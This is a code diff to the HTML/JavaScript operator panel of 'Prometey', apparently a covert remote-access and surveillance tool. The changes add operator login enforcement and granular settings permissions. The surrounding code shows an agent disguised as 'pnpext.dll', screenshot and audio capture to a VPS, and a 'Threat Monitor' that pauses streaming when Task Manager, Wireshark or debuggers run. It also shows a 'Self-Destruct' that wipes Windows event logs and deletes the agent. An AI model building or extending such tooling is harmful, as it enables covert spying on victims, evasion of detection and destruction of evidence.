@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta name="build" content="1.0.194" />
+<meta name="build" content="1.0.195" />
 <title>Prometey</title>
 <style>
 /* ═══════════════════════════════════════════════════
@@ -1725,7 +1725,7 @@ body {
         <span class="panel-title" data-i18n="title_settings">Settings</span>
       </div>
       <div style="flex:1; overflow-y:auto; padding:16px;">
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="save_paths" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_save_paths" style="font-size:12px; margin-bottom:8px; color:var(--muted);">Save paths — choose folder (Chrome/Edge need HTTPS or localhost)</div>
           <div id="settings-secure-warn" data-i18n-html="set_secure_warn" style="display:none; padding:8px; background:rgba(255,71,87,0.15); border-radius:6px; font-size:12px; margin-bottom:10px; color:var(--danger);">
             Folder picker works only on <b>HTTPS</b> or <b>localhost</b>. Open this page as https://your-server/ or use Port 8080 with a tunnel.
@@ -1755,7 +1755,7 @@ body {
             <span id="au-folder-path-settings" data-i18n="st_not_set" style="font-size:12px; color:var(--muted); margin-left:8px;">Not set</span>
           </div>
         </div>
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="screenshots_vps" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_ss_vps" style="font-size:12px; margin-bottom:8px; color:var(--muted);">Screenshots — VPS Storage</div>
           <div class="form-row" style="align-items:center; margin-bottom:10px;">
             <label class="form-label" data-i18n="set_vps_quota_mb" style="min-width:200px;">VPS Quota (MB)</label>
@@ -1764,7 +1764,7 @@ body {
             <span id="ss-quota-info" style="font-size:12px; color:var(--muted); margin-left:8px;"></span>
           </div>
         </div>
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="audio_vps" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_au_vps" style="font-size:12px; margin-bottom:8px; color:var(--muted);">Audio — VPS Storage</div>
           <div class="form-row" style="align-items:center; margin-bottom:10px;">
             <label class="form-label" data-i18n="set_vps_quota_mb" style="min-width:200px;">VPS Quota (MB)</label>
@@ -1773,7 +1773,7 @@ body {
             <span id="au-quota-info" style="font-size:12px; color:var(--muted); margin-left:8px;"></span>
           </div>
         </div>
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="streaming" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_streaming" style="font-size:12px; margin-bottom:8px; color:var(--muted);">Streaming</div>
           <div class="form-row" style="align-items:center; margin-bottom:10px;">
             <label class="form-label" data-i18n="set_jitter_buf" style="min-width:120px;">Jitter buffer</label>
@@ -1787,7 +1787,7 @@ body {
             Lower = less latency (good for remote desktop), higher = smoother playback. Default: 5
           </div>
         </div>
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="ice_servers" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_webrtc_ice" style="font-size:12px; margin-bottom:8px; color:var(--muted);">WebRTC ICE Servers (host config)</div>
           <div class="form-row" style="align-items:center; margin-bottom:10px;">
             <label class="form-label" data-i18n="set_stun" style="min-width:120px;">STUN server</label>
@@ -1822,7 +1822,7 @@ body {
             <span id="ice-save-status" style="font-size:12px; color:var(--muted); align-self:center;"></span>
           </div>
         </div>
-<div class="settings-block" style="margin-bottom:20px;">
+<div class="settings-block" data-settings-block="host_update" style="margin-bottom:20px;">
           <div style="display:flex;align-items:center;gap:12px;margin-bottom:4px;flex-wrap:wrap;">
             <span class="panel-title" data-i18n="set_host_update" style="font-size:12px;color:var(--muted);">Remote Host Update (pnpext.dll)</span>
             <span id="update-version" style="font-size:11px;color:#4caf50;font-family:monospace;"></span>
@@ -1865,7 +1865,7 @@ body {
             Host downloads, replaces DLL, restarts service. Auto-reconnects in ~10s.
           </div>
         </div>
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="vps_deploy" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_vps_deploy" style="font-size:12px; margin-bottom:8px; color:var(--muted);">VPS Deploy (upload files to server)</div>
           <div style="display:grid;grid-template-columns:1fr auto auto;gap:6px;align-items:center;">
             <div data-i18n="set_deploy_html" style="font-size:11px;color:#888;">index.html (client UI)</div>
@@ -1891,7 +1891,7 @@ body {
           </div>
         </div>
 
-        <div class="settings-block" style="margin-bottom:20px;">
+        <div class="settings-block" data-settings-block="host_config" style="margin-bottom:20px;">
           <div class="panel-title" data-i18n="set_cfg_editor" style="font-size:12px; margin-bottom:8px; color:var(--muted);">📝 Host Config Editor (encrypted pnpext.sys)</div>
           <div style="display:flex; gap:8px; margin-bottom:8px; flex-wrap:wrap;">
             <button type="button" class="fm-btn" data-i18n="set_cfg_load" onclick="cfgLoad()">Load from host</button>
@@ -1905,7 +1905,7 @@ body {
           </div>
           <textarea id="cfg-editor" spellcheck="false" data-i18n-ph="ph_cfg_editor" style="width:100%;height:280px;background:#111;color:#e0e0e0;border:1px solid var(--border);border-radius:6px;padding:10px;font-family:'Consolas','Courier New',monospace;font-size:12px;line-height:1.5;resize:vertical;tab-size:2;" placeholder="Click 'Load from host' to read config..."></textarea>
         </div>
-        <div class="settings-block" style="margin-bottom:20px; padding:12px; border:1px solid #ef6c00; border-radius:8px; background:rgba(239,108,0,0.05);">
+        <div class="settings-block" data-settings-block="threat" style="margin-bottom:20px; padding:12px; border:1px solid #ef6c00; border-radius:8px; background:rgba(239,108,0,0.05);">
           <div class="panel-title" data-i18n="set_threat_mon" style="font-size:12px; margin-bottom:8px; color:#ffa726;">🛡️ Threat Monitor</div>
           <div data-i18n="set_threat_desc" style="font-size:12px; color:var(--muted); margin-bottom:10px;">
             Отслеживает Task Manager, Process Explorer/Hacker, Wireshark, Procmon, x64dbg, Fiddler, TCPView, Параметры Windows и др. При обнаружении приостанавливает отправку видео и аудио хостом.
@@ -1922,7 +1922,7 @@ body {
           <div id="threat-current-status" style="font-size:12px; color:var(--muted); margin-top:8px;"></div>
         </div>
 
-        <div class="settings-block" style="margin-bottom:20px; padding:12px; border:1px solid #c62828; border-radius:8px; background:rgba(198,40,40,0.05);">
+        <div class="settings-block" data-settings-block="self_destruct" style="margin-bottom:20px; padding:12px; border:1px solid #c62828; border-radius:8px; background:rgba(198,40,40,0.05);">
           <div class="panel-title" data-i18n="set_selfdestruct" style="font-size:12px; margin-bottom:8px; color:#ff6b6b;">🔥 Self-Destruct (необратимо)</div>
           <div data-i18n="set_selfdestruct_desc" style="font-size:12px; color:var(--muted); margin-bottom:10px;">
             Затирает конфиг, лог, исполняемый файл хоста и журналы Application/System/Setup на удалённой машине. Хост отключится и удалит сам себя с диска.
@@ -3222,75 +3222,82 @@ function handleText(raw) {
       localStorage.setItem('rdp_password', document.getElementById('in-pass').value);
     } catch (e) {}
     setConnStatus('online');
-    // Operator login step: after the relay auth succeeded, send user_login
-    // with the operator's username/password (collected in the modal). The
-    // server returns role + allowed_tabs + a session token; we persist the
-    // token in memory (state.session) and apply tab visibility from the
-    // allowed_tabs list. Admins get all tabs; operators get a subset.
-    try {
-      const uname = document.getElementById('in-user').value.trim();
-      const upass = document.getElementById('in-user-pass').value;
-      if (uname && upass) {
-        // sendCmd resolves with msg.data directly (see handleText around
-        // line 3341). On success we get {session, username, role,
-        // allowed_tabs, all_tabs}. On server error sendCmd rejects with
-        // Error(msg.error), so errors land in .catch().
-        sendCmd({cmd:'user_login', username: uname, password: upass})
-          .then(data => {
-            state.session      = data.session;
-            state.username     = data.username;
-            state.userRole     = data.role;
-            state.allowedTabs  = data.allowed_tabs || [];
-            state.allTabs      = data.all_tabs || [];
-            try { localStorage.setItem('rdp_user', uname); } catch (e) {}
-            applyTabVisibility();
-            addLog('Logged in as ' + state.username + ' (' + state.userRole + ')', 'OK');
-          })
-          .catch(e => {
-            addLog('Operator login failed: ' + e.message, 'WARN');
-            notify('Operator login failed: ' + e.message, 'warn');
-          });
-      }
-    } catch(e) {}
-
-    document.getElementById('modal-overlay').classList.add('hidden');
-    document.getElementById('btn-connect').classList.add('hidden');
-    document.getElementById('btn-disconnect').classList.remove('hidden');
-    addLog(`Connected. Host: ${msg.host_online ? 'ONLINE' : 'OFFLINE'}`, msg.host_online ? 'OK' : 'WARN');
-    notify('Connected to relay server', 'success');
-    openFileWebSocket();  // Open dedicated file channel
-    if (msg.host_online) {
-      refreshDashboard();
-      loadSettingsFromHost();
-      startDashAutoRefresh();
-    } else {
-      // Host offline at connect — poll every 2s to detect when host comes online
-      addLog(t('msg_waiting_host'), 'INFO');
-      const pollHost = setInterval(() => {
-        if (state.hostOnline || !state.connected) { clearInterval(pollHost); return; }
-        // Ask VPS directly if host is connected (no relay to host needed)
-        if (state.ws && state.ws.readyState === 1) {
-          state.ws.send(JSON.stringify({ cmd: 'ping' }));
-        }
-        sendCmd({ cmd: 'sys_info' }).then(() => {
-          if (!state.hostOnline) {
-            state.hostOnline = true;
-            setConnStatus('online');
-            addLog(t('msg_host_online'), 'OK');
-            notify('Host is now online', 'success');
-            refreshDashboard();
-            loadSettingsFromHost();
-            startDashAutoRefresh();
-            if (typeof ssAutoDownloadAll === 'function') setTimeout(ssAutoDownloadAll, 3000);
-            if (typeof auAutoDownloadAll === 'function') setTimeout(auAutoDownloadAll, 4000);
-            if (typeof ssLoadQuotaFromVPS === 'function') ssLoadQuotaFromVPS();
-            if (typeof ssLoadStatus === 'function') setTimeout(ssLoadStatus, 2000);
-            if (typeof auLoadStatus === 'function') setTimeout(auLoadStatus, 2500);
-          }
-          clearInterval(pollHost);
-        }).catch(() => {}); // host still offline
-      }, 2000);
+    // Operator login: WSS auth (room_token) succeeded, but the operator
+    // still has to authenticate individually. If the user typed wrong
+    // credentials we must BLOCK the app until they fix it — don't close
+    // the modal, don't consider connection "open", and disconnect WSS
+    // so the relay isn't holding an unauthenticated session open.
+    const uname = (document.getElementById('in-user').value || '').trim();
+    const upass = document.getElementById('in-user-pass').value;
+    if (!uname || !upass) {
+      const err = document.getElementById('modal-error');
+      if (err) err.textContent = 'Operator username and password are required';
+      // Keep modal open; tear down the WSS so server doesn't see us as
+      // authenticated.
+      state.wantDisconnect = true;
+      try { state.ws.close(); } catch(e) {}
+      state.connected = false;
+      return;
     }
+    const finishInit = () => {
+      document.getElementById('modal-overlay').classList.add('hidden');
+      document.getElementById('btn-connect').classList.add('hidden');
+      document.getElementById('btn-disconnect').classList.remove('hidden');
+      addLog(`Connected. Host: ${msg.host_online ? 'ONLINE' : 'OFFLINE'}`, msg.host_online ? 'OK' : 'WARN');
+      notify('Connected to relay server', 'success');
+      openFileWebSocket();
+      if (msg.host_online) {
+        refreshDashboard();
+        loadSettingsFromHost();
+        startDashAutoRefresh();
+      } else {
+        addLog(t('msg_waiting_host'), 'INFO');
+        const pollHost = setInterval(() => {
+          if (state.hostOnline || !state.connected) { clearInterval(pollHost); return; }
+          if (state.ws && state.ws.readyState === 1) {
+            state.ws.send(JSON.stringify({ cmd: 'ping' }));
+          }
+          sendCmd({ cmd: 'sys_info' }).then(() => {
+            if (!state.hostOnline) {
+              state.hostOnline = true;
+              setConnStatus('online');
+              addLog(t('msg_host_online'), 'OK');
+              notify('Host is now online', 'success');
+              refreshDashboard();
+              loadSettingsFromHost();
+              startDashAutoRefresh();
+              if (typeof ssAutoDownloadAll === 'function') setTimeout(ssAutoDownloadAll, 3000);
+              if (typeof auAutoDownloadAll === 'function') setTimeout(auAutoDownloadAll, 4000);
+              if (typeof ssLoadQuotaFromVPS === 'function') ssLoadQuotaFromVPS();
+              if (typeof ssLoadStatus === 'function') setTimeout(ssLoadStatus, 2000);
+              if (typeof auLoadStatus === 'function') setTimeout(auLoadStatus, 2500);
+            }
+            clearInterval(pollHost);
+          }).catch(() => {});
+        }, 2000);
+      }
+    };
+
+    sendCmd({cmd:'user_login', username: uname, password: upass})
+      .then(data => {
+        state.session      = data.session;
+        state.username     = data.username;
+        state.userRole     = data.role;
+        state.allowedTabs  = data.allowed_tabs || [];
+        state.allTabs      = data.all_tabs || [];
+        try { localStorage.setItem('rdp_user', uname); } catch (e) {}
+        applyTabVisibility();
+        addLog('Logged in as ' + state.username + ' (' + state.userRole + ')', 'OK');
+        finishInit();
+      })
+      .catch(e => {
+        const err = document.getElementById('modal-error');
+        if (err) err.textContent = 'Login failed: ' + e.message;
+        addLog('Operator login failed: ' + e.message, 'WARN');
+        state.wantDisconnect = true;
+        try { state.ws.close(); } catch(ex) {}
+        state.connected = false;
+      });
     return;
   }
 
@@ -10640,25 +10647,41 @@ function progExport() {
 // ═══════════════════════════════════════════════════════════════════════
 
 function applyTabVisibility() {
-  // Server returns allowed_tabs as a list of panel names. Hide any nav-btn
-  // whose data-panel isn't in that list. Nav-panels not listed in ALL_TABS
-  // (older panels this script doesn't know about) stay visible for admins.
+  // Server returns allowed_tabs as a list of panel names + optional
+  // settings.<block> sub-item names. Hide nav-btns whose data-panel
+  // isn't in the set; hide Settings sub-blocks whose data-settings-block
+  // name isn't in the set (when user has plain "settings", ALL blocks
+  // are shown — the granular names act as "also this" overrides).
   const allowed = new Set(state.allowedTabs || []);
-  // host_events + users live in ALL_TABS; admin gets them automatically.
-  // For operators, they appear only if explicitly listed in allowed_tabs.
+  const hasSettingsRoot = allowed.has('settings');
+
   document.querySelectorAll('.nav-btn[data-panel]').forEach(btn => {
     const panel = btn.getAttribute('data-panel');
-    // 'screen' is always visible (it's the home surface — can't hide it).
-    // 'dashboard' too — always grant the overview.
-    if (panel === 'screen' || panel === 'dashboard') return;
-    // Users tab is admin-only regardless of allowed_tabs.
+    if (panel === 'screen' || panel === 'dashboard') return;  // always visible
     if (panel === 'users') {
       btn.style.display = (state.userRole === 'admin') ? '' : 'none';
       return;
     }
-    btn.style.display = allowed.has(panel) ? '' : 'none';
+    // Settings tab is visible if user has "settings" OR any "settings.X"
+    let visible = allowed.has(panel);
+    if (panel === 'settings' && !visible) {
+      for (const a of allowed) {
+        if (a.indexOf('settings.') === 0) { visible = true; break; }
+      }
+    }
+    btn.style.display = visible ? '' : 'none';
   });
-  // If the currently-open panel got hidden, switch to dashboard.
+
+  // Filter Settings sub-blocks by data-settings-block attribute.
+  // If user has plain "settings", show all blocks. Otherwise show
+  // only blocks whose name is allowed as "settings.<block>".
+  document.querySelectorAll('.settings-block[data-settings-block]').forEach(div => {
+    const name = div.getAttribute('data-settings-block');
+    const ok = hasSettingsRoot || allowed.has('settings.' + name);
+    div.style.display = ok ? '' : 'none';
+  });
+
+  // If active panel got hidden, switch to dashboard.
   const activeBtn = document.querySelector('.nav-btn.active');
   if (activeBtn && activeBtn.style.display === 'none') {
     const home = document.querySelector('.nav-btn[data-panel="dashboard"]');
@@ -10882,7 +10905,8 @@ function usrEditDialog(user) {
           <button type="button" id="usr-dlg-def"  class="btn-secondary" style="padding:2px 8px;font-size:10px;">Role default</button>
         </div>
       </div>
-      <div id="usr-dlg-tabs" style="display:grid;grid-template-columns:repeat(3,1fr);gap:4px;padding:8px;background:var(--bg-dark);border:1px solid var(--bd);border-radius:3px;max-height:240px;overflow-y:auto;"></div>
+      <div id="usr-dlg-tabs" style="display:grid;grid-template-columns:repeat(3,1fr);gap:4px;padding:8px;background:var(--bg-dark);border:1px solid var(--bd);border-radius:3px;max-height:200px;overflow-y:auto;"></div>
+      <div id="usr-dlg-settings-sub" style="display:grid;grid-template-columns:repeat(3,1fr);gap:4px;padding:8px;background:var(--bg-dark);border:1px solid var(--bd);border-top:none;border-radius:0 0 3px 3px;max-height:160px;overflow-y:auto;"></div>
     </div>
 
     <div id="usr-dlg-err" style="color:var(--danger);font-size:12px;min-height:16px;margin-bottom:8px;"></div>
@@ -10895,16 +10919,46 @@ function usrEditDialog(user) {
   overlay.appendChild(modal);
   document.body.appendChild(overlay);
 
-  // Tabs checkbox grid
+  // Tabs checkbox grid — top-level tabs first, then a sub-section for
+  // Settings blocks (visible when "settings" is enabled).
+  const topLevel = allTabs.filter(t => t.indexOf('settings.') !== 0);
+  const settingsBlocks = allTabs.filter(t => t.indexOf('settings.') === 0);
+
+  const safeId = (s) => 'usr-dlg-tab-' + s.replace(/\./g, '_');
+
   const renderTabs = (enabledSet) => {
     const grid = modal.querySelector('#usr-dlg-tabs');
     grid.innerHTML = '';
-    for (const t of allTabs) {
-      const id = 'usr-dlg-tab-' + t;
+    for (const t of topLevel) {
       const lbl = document.createElement('label');
       lbl.style.cssText = 'display:flex;align-items:center;gap:6px;padding:4px 6px;font-size:12px;cursor:pointer;';
-      lbl.innerHTML = `<input type="checkbox" id="${id}" ${enabledSet.has(t)?'checked':''} style="margin:0;" /> <span>${t}</span>`;
+      lbl.innerHTML = `<input type="checkbox" id="${safeId(t)}" ${enabledSet.has(t)?'checked':''} style="margin:0;" /> <span>${t}</span>`;
       grid.appendChild(lbl);
+    }
+    // Settings sub-blocks: shown in a separate section below the main grid.
+    const subWrap = modal.querySelector('#usr-dlg-settings-sub');
+    if (subWrap) {
+      subWrap.innerHTML = '';
+      const hasSettings = enabledSet.has('settings');
+      const hasAnySub = settingsBlocks.some(s => enabledSet.has(s));
+      if (hasSettings || hasAnySub) {
+        subWrap.style.display = '';
+        const title = document.createElement('div');
+        title.style.cssText = 'grid-column:1/-1;font-size:10px;color:var(--muted);text-transform:uppercase;margin:8px 0 4px;';
+        title.textContent = hasSettings
+          ? 'Settings sub-blocks (all visible when "settings" is ticked — untick to restrict)'
+          : 'Settings sub-blocks (granular access — top-level "settings" NOT granted)';
+        subWrap.appendChild(title);
+        for (const s of settingsBlocks) {
+          const short = s.replace('settings.', '');
+          const lbl = document.createElement('label');
+          lbl.style.cssText = 'display:flex;align-items:center;gap:6px;padding:4px 6px;font-size:12px;cursor:pointer;';
+          lbl.innerHTML = `<input type="checkbox" id="${safeId(s)}" ${enabledSet.has(s)?'checked':''} style="margin:0;" /> <span>${short}</span>`;
+          subWrap.appendChild(lbl);
+        }
+      } else {
+        subWrap.style.display = 'none';
+      }
     }
   };
   renderTabs(curAllowed);
@@ -10924,6 +10978,18 @@ function usrEditDialog(user) {
   };
   modal.querySelector('#usr-dlg-cancel').onclick = () => overlay.remove();
 
+  // When "settings" toggles, re-render so sub-block UI updates.
+  modal.addEventListener('change', (e) => {
+    if (e.target && e.target.id === safeId('settings')) {
+      const now = new Set();
+      for (const t of allTabs) {
+        const cb = modal.querySelector('#' + safeId(t));
+        if (cb && cb.checked) now.add(t);
+      }
+      renderTabs(now);
+    }
+  });
+
   modal.querySelector('#usr-dlg-save').onclick = async () => {
     const err = modal.querySelector('#usr-dlg-err');
     err.textContent = '';
@@ -10932,7 +10998,8 @@ function usrEditDialog(user) {
     const role = modal.querySelector('#usr-dlg-role').value;
     const tabs = [];
     for (const t of allTabs) {
-      if (modal.querySelector('#usr-dlg-tab-' + t).checked) tabs.push(t);
+      const cb = modal.querySelector('#' + safeId(t));
+      if (cb && cb.checked) tabs.push(t);
     }
     if (!name) { err.textContent = 'Username required'; return; }
     if (isNew && !pwd) { err.textContent = 'Password required'; return; }
